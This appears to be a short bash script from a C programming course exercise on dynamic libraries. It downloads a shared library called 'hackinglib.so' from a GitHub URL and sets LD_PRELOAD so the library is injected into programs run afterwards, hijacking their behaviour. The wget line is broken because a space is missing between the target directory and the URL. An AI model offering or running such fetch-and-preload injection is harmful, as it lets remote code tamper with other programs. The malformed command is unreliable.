#!/bin/bash
wget -P ..https://raw.githubusercontent.com/Salma-nasser/alx-low_level_programming/master/0x18-dynamic_libraries/hackinglib.so
export LD_PRELOAD="$PWD/../hackinglib.so"
